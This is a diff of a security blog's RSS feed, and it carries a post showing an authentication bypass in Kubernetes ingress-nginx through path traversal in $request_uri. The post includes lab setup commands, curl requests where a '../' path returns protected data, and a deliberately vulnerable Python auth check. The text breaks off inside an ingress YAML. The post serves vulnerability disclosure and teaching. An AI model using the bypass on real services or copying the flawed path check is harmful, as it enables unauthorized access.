@@ -1,5 +1,599 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>nginx on xvnpw personal blog</title><link>https://xvnpw.github.io/tags/nginx/</link><description>Recent content in nginx on xvnpw personal blog</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Sun, 29 May 2022 16:59:02 +0100</lastBuildDate><atom:link href="https://xvnpw.github.io/tags/nginx/index.xml" rel="self" type="application/rss+xml"/><item><title>External Authentication bypass in ingress-nginx</title><link>https://xvnpw.github.io/posts/external_authentication_bypass_in_ingress_nginx/</link><pubDate>Sun, 29 May 2022 16:59:02 +0100</pubDate><guid>https://xvnpw.github.io/posts/external_authentication_bypass_in_ingress_nginx/</guid><description>In October 2021 I was researched ingress-nginx for possibility to bypass external authentication using path traversal. It was origin story for other investigations regarding insecure usage of $request_uri which leaded to Apache APISIX CVE-2021-43557. I have started with report on HackerOne to Kubernetes project: https://hackerone.com/reports/1357948. It took long time for the team to investigate it, but in the end I got some bounty 😏 sadly report was closed as informative.</description></item><item><title>Hunting for buggy authentication/authorization services on github</title><link>https://xvnpw.github.io/posts/hunting_for_buggy_authentication_authorization_services_on_github/</link><pubDate>Sun, 28 Nov 2021 10:58:59 +0100</pubDate><guid>https://xvnpw.github.io/posts/hunting_for_buggy_authentication_authorization_services_on_github/</guid><description>To successful bypass access control using path traversal in $request_uri, you need to have buggy authentication/authorization service. Buggy in a way it&amp;rsquo;s not normalizing url/uri that is part of access control decision. Let me find more of those on github that are relying on X-Original-Url. There is high chance that this header is populated from $request_uri variable and not protected in any way.
-pomerium Pomerium is an identity-aware proxy that enables secure access to internal applications.</description></item><item><title>Bug bounty tips for nginx $request_uri path traversal bypass</title><link>https://xvnpw.github.io/posts/bug_bounty_tips_for_nginx_request_uri_path_traversal_bypass/</link><pubDate>Sat, 27 Nov 2021 22:59:05 +0100</pubDate><guid>https://xvnpw.github.io/posts/bug_bounty_tips_for_nginx_request_uri_path_traversal_bypass/</guid><description>In this article, I will extend topic by bug bounty tips for weaknesses in authentication/authorization implementation in relation to nginx&amp;rsquo;s $request_uri variable.
-APIs This vulnerability is for APIs. Best scenario are microservice deployed to Kubernetes and exposed by ingress controller.
-Using paths API that you are playing with, need to use paths to address services, e.g.:
-OK! https://api.example.com/user-service https://api.example.com/customer-service ... NOT OK! https://user.example.com/ https://customer.example.com/ First set of URLs is good for exploitation, as you can try sending request with https://api.</description></item></channel></rss>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>nginx on xvnpw personal blog</title><link>https://xvnpw.github.io/tags/nginx/</link><description>Recent content in nginx on xvnpw personal blog</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Sun, 29 May 2022 16:59:02 +0100</lastBuildDate><atom:link href="https://xvnpw.github.io/tags/nginx/index.xml" rel="self" type="application/rss+xml"/><item><title>External Authentication bypass in ingress-nginx</title><link>https://xvnpw.github.io/posts/external_authentication_bypass_in_ingress_nginx/</link><pubDate>Sun, 29 May 2022 16:59:02 +0100</pubDate><guid>https://xvnpw.github.io/posts/external_authentication_bypass_in_ingress_nginx/</guid><description>&lt;figure class="image-center">&lt;img src="https://user-images.githubusercontent.com/17719543/170878532-514c01cc-aa97-42b2-adba-f61a155d9863.png"/>
+&lt;/figure>
+&lt;p>In October 2021 I was researched &lt;a class="link" href="https://kubernetes.github.io/ingress-nginx/" target="_blank" rel="noopener"
+>ingress-nginx&lt;/a> for possibility to bypass external authentication using path traversal. It was origin story for other investigations regarding insecure usage of &lt;code>$request_uri&lt;/code> which leaded to &lt;a class="link" href="https://apisix.apache.org/blog/2021/11/23/cve-2021-43557-research-report/" target="_blank" rel="noopener"
+>Apache APISIX CVE-2021-43557&lt;/a>. I have started with report on HackerOne to Kubernetes project: &lt;a class="link" href="https://hackerone.com/reports/1357948" target="_blank" rel="noopener"
+>https://hackerone.com/reports/1357948&lt;/a>. It took long time for the team to investigate it, but in the end I got some bounty 😏 sadly report was closed as informative. They asked me to create normal &lt;a class="link" href="https://github.com/kubernetes/ingress-nginx/issues/8644" target="_blank" rel="noopener"
+>issue&lt;/a> in github as this behavior is considered as &lt;strong>not security issue&lt;/strong>. For me this is still an issue of &lt;strong>insecure design&lt;/strong>.&lt;/p>
+&lt;p>Just look on values of &lt;code>X-Original-Url&lt;/code> and &lt;code>X-Auth-Request-Redirect&lt;/code> that are send to external auth service:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">X-Request-Id: 7d979c82ca55141ed0d58655fbaac586
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Host: auth-service.default.svc.cluster.local
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">X-Original-Url: http://app.test/public-service/..%2Fprotected-service/protected
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">X-Original-Method: GET
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">X-Sent-From: nginx-ingress-controller
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">X-Real-Ip: 192.168.99.1
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">X-Forwarded-For: 192.168.99.1
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">X-Auth-Request-Redirect: /public-service/..%2Fprotected-service/protected
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Connection: close
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">User-Agent: curl/7.75.0
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Accept: */*
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Root cause of the problem, is how nginx is handling &lt;code>$request_uri&lt;/code> variable. It&amp;rsquo;s documented very &amp;ldquo;frugal&amp;rdquo;:&lt;/p>
+&lt;figure class="image-center">&lt;img src="https://user-images.githubusercontent.com/17719543/170879498-1cca915f-9c5f-45f3-a6fc-fdfc97ff22a2.png"/>
+&lt;/figure>
+&lt;p>For me it&amp;rsquo;s not enough. There should be brought documentation of risks associated with consuming not normalized paths. After pointing it out to nginx team, I got response that it&amp;rsquo;s obvious that &lt;code>$request_uri&lt;/code> is not normalized and developers should take care of their projects 😕. This would be perfect world, but we are not living in such. Just compare it with documentation in &lt;a class="link" href="https://www.envoyproxy.io" target="_blank" rel="noopener"
+>envoy&lt;/a>:&lt;/p>
+&lt;ul>
+&lt;li>&lt;a class="link" href="https://www.getambassador.io/docs/edge-stack/latest/topics/running/ambassador/#rejecting-client-requests-with-escaped-slashes" target="_blank" rel="noopener"
+>rejecting-client-requests-with-escaped-slashes&lt;/a> - although it&amp;rsquo;s not directly for Emissary. It&amp;rsquo;s describing well envoy concerts for escaped slashes&lt;/li>
+&lt;li>&lt;a class="link" href="https://github.com/envoyproxy/envoy/security/advisories/GHSA-xcx5-93pw-jw2w" target="_blank" rel="noopener"
+>GHSA-xcx5-93pw-jw2w&lt;/a> (CVE-2019–9901) - description of risks associated with normalizing paths in envoy&lt;/li>
+&lt;li>&lt;a class="link" href="https://www.envoyproxy.io/docs/envoy/latest/api-v3/extensions/filters/network/http_connection_manager/v3/http_connection_manager.proto" target="_blank" rel="noopener"
+>envoy http connection manager options&lt;/a> - look for two particular: &lt;code>normalize_path&lt;/code> and &lt;code>path_with_escaped_slashes_action&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;p>&lt;strong>If you thinks similar. Put your comment in &lt;a class="link" href="https://github.com/kubernetes/ingress-nginx/issues/8644" target="_blank" rel="noopener"
+>https://github.com/kubernetes/ingress-nginx/issues/8644&lt;/a>&lt;/strong>&lt;/p>
+&lt;h2 id="setting-thestage">Setting the stage&lt;/h2>
+&lt;h3 id="install-ingress-nginx-into-kubernetes">install ingress-nginx into Kubernetes:&lt;/h3>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">helm upgrade --install ingress-nginx ingress-nginx &lt;span class="se">\
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span> --repo https://kubernetes.github.io/ingress-nginx &lt;span class="se">\
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span> --namespace ingress-nginx --create-namespace
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>In case of problems follow &lt;a class="link" href="https://kubernetes.github.io/ingress-nginx/deploy/" target="_blank" rel="noopener"
+>official guide&lt;/a>.&lt;/p>
+&lt;h3 id="deploy-test-application">deploy test application&lt;/h3>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">kubectl apply -f &lt;span class="se">\
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span> https://raw.githubusercontent.com/xvnpw/k8s-ingress-auth-bypass/master/app.yaml
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h3 id="optional-forward-ingress-port">[optional] forward ingress port&lt;/h3>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">kubectl port-forward service/ingress-nginx-controller &lt;span class="se">\ &lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> -n ingress-nginx 8080:80
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h3 id="verify-services">verify services&lt;/h3>
+&lt;p>First public service. It should be available without authentication:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">$ curl http://127.0.0.1:8080/public-service/public -H &lt;span class="s2">&amp;#34;Host: app.test&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">{&lt;/span>&lt;span class="s2">&amp;#34;data&amp;#34;&lt;/span>:&lt;span class="s2">&amp;#34;public data&amp;#34;&lt;/span>&lt;span class="o">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>and now protected:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">$ curl http://127.0.0.1:8080/protected-service/protected -H &lt;span class="s2">&amp;#34;Host: app.test&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&amp;lt;html&amp;gt;
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&amp;lt;head&amp;gt;&amp;lt;title&amp;gt;401 Authorization Required&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&amp;lt;body&amp;gt;
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&amp;lt;center&amp;gt;&amp;lt;h1&amp;gt;401 Authorization Required&amp;lt;/h1&amp;gt;&amp;lt;/center&amp;gt;
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&amp;lt;hr&amp;gt;&amp;lt;center&amp;gt;nginx&amp;lt;/center&amp;gt;
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&amp;lt;/body&amp;gt;
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&amp;lt;/html&amp;gt;
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">$ curl http://127.0.0.1:8080/protected-service/protected &lt;span class="se">\
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span> -H &lt;span class="s2">&amp;#34;X-Api-Key: secret-api-key&amp;#34;&lt;/span> -H &lt;span class="s2">&amp;#34;Host: app.test&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">{&lt;/span>&lt;span class="s2">&amp;#34;data&amp;#34;&lt;/span>:&lt;span class="s2">&amp;#34;protected data&amp;#34;&lt;/span>&lt;span class="o">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>as you can see I need to provide &amp;ldquo;secret-api-key&amp;rdquo; to get resource.&lt;/p>
+&lt;h2 id="exploitation">Exploitation&lt;/h2>
+&lt;p>Let&amp;rsquo;s send request with path traversal&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">$ curl &lt;span class="se">\
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span> --path-as-is http://127.0.0.1:8080/public-service/../protected-service/protected
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> -H &lt;span class="s2">&amp;#34;Host: app.test&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">{&lt;/span>&lt;span class="s2">&amp;#34;data&amp;#34;&lt;/span>:&lt;span class="s2">&amp;#34;protected data&amp;#34;&lt;/span>&lt;span class="o">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>As you can see, I was able to bypass uri restrictions 😄&lt;/p>
+&lt;h2 id="authentication-service">Authentication service&lt;/h2>
+&lt;p>Of course &lt;strong>not all&lt;/strong> authentication services will be vulnerable. Only those that are making specific decisions based on requested paths. In my case service looks like this:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="nd">@app&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">route&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;/verify&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">verify&lt;/span>&lt;span class="p">():&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">request&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">headers&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">file&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">sys&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">stderr&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">api_key&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">request&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">headers&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">get&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;X-Api-Key&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">request_redirect&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">request&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">headers&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">get&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;X-Auth-Request-Redirect&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="n">request_redirect&lt;/span> &lt;span class="ow">and&lt;/span> &lt;span class="n">request_redirect&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">startswith&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;/public-service/&amp;#34;&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">Response&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">status&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">HTTPStatus&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">NO_CONTENT&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="n">api_key&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="s2">&amp;#34;secret-api-key&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">Response&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">status&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">HTTPStatus&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">NO_CONTENT&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">Response&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">status&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">HTTPStatus&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">UNAUTHORIZED&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>and ingress is defined as:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;span class="lnt">27
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-yaml" data-lang="yaml">&lt;span class="line">&lt;span class="cl">&lt;span class="nt">apiVersion&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">networking.k8s.io/v1&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="nt">kind&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">Ingress&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="nt">metadata&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nt">name&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">my-ingress&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nt">annotations&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nt">kubernetes.io/ingress.class&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s2">&amp;#34;nginx&amp;#34;&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nt">nginx.ingress.kubernetes.io/rewrite-target&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">/$1&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nt">nginx.ingress.kubernetes.io/auth-url&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">http://auth-service.default.svc.cluster.local:8080/verify&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="nt">spec&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nt">rules&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>- &lt;span class="nt">host&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">app.test&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nt">http&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nt">paths&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>- &lt;span class="nt">path&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">/public-service/(.*)&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nt">pathType&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">Prefix&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nt">backend&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nt">service&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nt">name&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">public-service&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nt">port&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nt">number&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="m">8080&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>- &lt;span class="nt">path&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">/protected-service/(.*)&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nt">pathType&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">Prefix&lt;/span>&lt;span class="w">
